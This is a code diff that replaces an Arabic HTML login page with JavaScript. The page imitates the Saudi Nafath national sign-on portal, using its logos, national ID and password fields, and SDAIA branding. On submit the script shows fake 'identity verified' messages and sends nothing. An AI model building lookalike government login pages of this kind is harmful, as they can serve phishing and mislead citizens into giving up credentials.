@@ -1,139 +1,120 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نفاذ - تسجيل الدخول</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="style.css">
-</head>
-<body>
+document.addEventListener('DOMContentLoaded', () => {
+    
+    // ==========================================
+    // 1. تفاعلات الصفحة الرئيسية (Index Page)
+    // ==========================================
+    const loginCard = document.getElementById('loginCard');
+    if (loginCard) {
+        loginCard.addEventListener('click', () => {
+            loginCard.style.transform = 'scale(0.95)';
+            setTimeout(() => {
+                window.location.href = 'login.html';
+            }, 150);
+        });
+    }
 
-    <header class="main-header">
-        <div class="header-container">
-            <div class="logos-group">
-                <div class="logo-item">
-                    <img src="nafath-logo.png" alt="شعار نفاذ" class="responsive-logo nafath-img">
-                </div>
-                <div class="logo-item vision-border">
-                    <img src="vision2030-grey.svg" alt="شعار رؤية 2030" class="responsive-logo vision-img">
-                </div>
-            </div>
-            <div class="lang-switcher" id="langSwitch">
-                <i class="fa-solid fa-globe"></i>
-                <span>English</span>
-            </div>
-        </div>
-    </header>
+    // ==========================================
+    // 2. نظام التبويب والأكورديون الديناميكي (Accordion System)
+    // ==========================================
+    const tabs = document.querySelectorAll('.accordion-item');
+    const panels = document.querySelectorAll('.form-panel-card');
 
-    <main class="login-main-content">
-        <div class="accordion-container">
+    tabs.forEach(tab => {
+        tab.addEventListener('click', () => {
+            // التنفيذ فقط إذا كان التبويب المختار مغلقاً حالياً
+            if (tab.classList.contains('collapsed')) {
+                
+                // إذا نقر المستخدم على تبويب تطبيق نفاذ، نظهر التنبيه أولاً قبل التبديل
+                if (tab.id === 'tabNafathApp') {
+                    alert('طريقة التحقق عبر تطبيق نفاذ غير مفعلة حالياً، يرجى استخدام اسم المستخدم وكلمة المرور.');
+                }
+
+                // أ) تحويل كافة التبويبات للحالة المغلقة وتغيير الأيقونات لـ (+)
+                tabs.forEach(t => {
+                    t.classList.remove('active');
+                    t.classList.add('collapsed');
+                    const icon = t.querySelector('.status-icon');
+                    if (icon) {
+                        icon.classList.remove('fa-minus');
+                        icon.classList.add('fa-plus');
+                    }
+                });
+
+                // ب) إخفاء جميع لوحات النماذج
+                panels.forEach(p => {
+                    p.classList.add('hidden-panel');
+                });
+
+                // ج) تنشيط التبويب الحالي المختار وتحويل أيقونته لـ (-)
+                tab.classList.remove('collapsed');
+                tab.classList.add('active');
+                const currentIcon = tab.querySelector('.status-icon');
+                if (currentIcon) {
+                    currentIcon.classList.remove('fa-plus');
+                    currentIcon.classList.add('fa-minus');
+                }
+
+                // د) إظهار اللوحة المستهدفة المربوطة بالتبويب النشط
+                const targetPanelId = tab.getAttribute('data-target');
+                const targetPanel = document.getElementById(targetPanelId);
+                if (targetPanel) {
+                    targetPanel.classList.remove('hidden-panel');
+                }
+            }
+        });
+    });
+
+    // ==========================================
+    // 3. معالجة إرسال النماذج (اسم المستخدم / تطبيق نفاذ)
+    // ==========================================
+    
+    // أ) نموذج اسم المستخدم وكلمة المرور الأصلي
+    const authForm = document.getElementById('authForm');
+    if (authForm) {
+        authForm.addEventListener('submit', (e) => {
+            e.preventDefault();
             
-            <div class="accordion-item active" id="tabNafathApp" data-target="panelNafathApp">
-                <span class="accordion-title">تطبيق نفاذ</span>
-                <i class="fa-solid fa-minus status-icon"></i>
-            </div>
+            const submitBtn = authForm.querySelector('.btn-submit');
+            const originalContent = submitBtn.innerHTML;
+            
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> جاري التحقق الآمن...`;
+            
+            setTimeout(() => {
+                alert('تم التحقق بنجاح ومطابقة الهوية الرقمية للطلب الإلكتروني.');
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = originalContent;
+            }, 1500);
+        });
+    }
 
-            <div class="form-panel-card" id="panelNafathApp">
-                <div class="panel-grid">
-                    <div class="form-side">
-                        <form id="appForm" action="#" method="POST">
-                            <div class="input-group">
-                                <label for="nationalId">رقم بطاقة الأحوال/الإقامة</label>
-                                <input type="text" id="nationalId" placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا" required>
-                            </div>
-                            <button type="submit" class="btn-submit">
-                                <i class="fa-solid fa-right-to-bracket"></i> تسجيل الدخول
-                            </button>
-                        </form>
-                        
-                        <div class="download-app-section">
-                            <span class="download-title">لتحميل تطبيق نفاذ</span>
-                            <div class="store-buttons">
-                                <img src="appstore.png" alt="App Store" class="store-btn">
-                                <img src="googleplay.png" alt="Google Play" class="store-btn">
-                                <img src="appgallery.png" alt="AppGallery" class="store-btn">
-                            </div>
-                        </div>
-                    </div>
+    // ب) نموذج رقم بطاقة الأحوال (الخاص بتبويب تطبيق نفاذ المضاف حديثاً)
+    const appForm = document.getElementById('appForm');
+    if (appForm) {
+        appForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            alert('تم إرسال طلب المطابقة الآمن للمنصة بنجاح.');
+        });
+    }
 
-                    <div class="illustration-side">
-                        <img src="secure.svg" alt="Secure Authentication" class="secure-vector-img">
-                        <p class="instruction-text">الرجاء إدخال رقم بطاقة الأحوال/الإقامة، ثم اضغط دخول.</p>
-                    </div>
-                </div>
-            </div>
-
-            <div class="accordion-item collapsed" id="tabUserPass" data-target="panelUserPass">
-                <span class="accordion-title">اسم المستخدم وكلمة المرور</span>
-                <i class="fa-solid fa-plus status-icon"></i>
-            </div>
-
-            <div class="form-panel-card hidden-panel" id="panelUserPass">
-                <div class="panel-grid">
-                    <div class="form-side">
-                        <form id="authForm" action="#" method="POST">
-                            <div class="input-group">
-                                <label for="username">اسم المستخدم \ الهوية الوطنية</label>
-                                <input type="text" id="username" placeholder="اسم المستخدم \ الهوية الوطنية" required>
-                            </div>
-                            
-                            <div class="input-group">
-                                <label for="password">كلمة المرور</label>
-                                <input type="password" id="password" placeholder="كلمة المرور" required>
-                            </div>
-
-                            <button type="submit" class="btn-submit">
-                                <i class="fa-solid fa-right-to-bracket"></i> تسجيل الدخول
-                            </button>
-                        </form>
-
-                        <div class="form-actions-helpers">
-                            <a href="#" class="btn-helper"><i class="fa-solid fa-lock-open"></i> إعادة تعيين/تغيير كلمة المرور</a>
-                            <a href="#" class="btn-helper"><i class="fa-solid fa-user-plus"></i> حساب جديد</a>
-                        </div>
-                    </div>
-
-                    <div class="illustration-side">
-                        <img src="secure.svg" alt="Secure Authentication" class="secure-vector-img">
-                        <p class="instruction-text">الرجاء إدخال اسم المستخدم \ الهوية الوطنية وكلمة المرور ثم اضغط تسجيل الدخول</p>
-                    </div>
-                </div>
-            </div>
-
-        </div>
-    </main>
-
-    <footer class="main-footer">
-        <div class="footer-container">
-            <div class="footer-left">
-                <div class="sdaia-wrapper">
-                    <img src="sdaia-logo.svg" alt="SDAIA Logo" class="sdaia-img">
-                </div>
-                <div class="copyright-text">
-                    <p class="dev-op">Development and operation</p>
-                    <p class="authority-name">Saudi Data & AI Authority</p>
-                    <p class="rights">National Single Sign-On All rights reserved © 2026</p>
-                </div>
-            </div>
-
-            <div class="footer-right">
-                <nav class="footer-links">
-                    <a href="#">Home</a>
-                    <a href="#">About</a>
-                    <a href="#">Contact Us</a>
-                    <a href="#">Terms & Conditions</a>
-                    <a href="#">Assitance & Support</a>
-                    <a href="#">Privacy</a>
-                </nav>
-                <div class="digital-stamp">
-                    <i class="fa-solid fa-shield-halved"></i> Digital Stamp
-                </div>
-            </div>
-        </div>
-    </footer>
-
-    <script src="script.js"></script>
-</body>
-</html>
+    // ==========================================
+    // 4. زر تبديل اللغة وإدارة اتجاه الصفحة (مشترك)
+    // ==========================================
+    const langSwitch = document.getElementById('langSwitch');
+    if (langSwitch) {
+        langSwitch.addEventListener('click', () => {
+            const currentLang = langSwitch.querySelector('span').innerText.trim();
+            if (currentLang === 'عربي') {
+                langSwitch.querySelector('span').innerText = 'English';
+                document.documentElement.setAttribute('dir', 'rtl');
+                document.documentElement.setAttribute('lang', 'ar');
+                document.body.style.direction = 'rtl';
+            } else {
+                langSwitch.querySelector('span').innerText = 'عربي';
+                document.documentElement.setAttribute('dir', 'ltr');
+                document.documentElement.setAttribute('lang', 'en');
+                document.body.style.direction = 'ltr';
+            }
+        });
+    }
+});
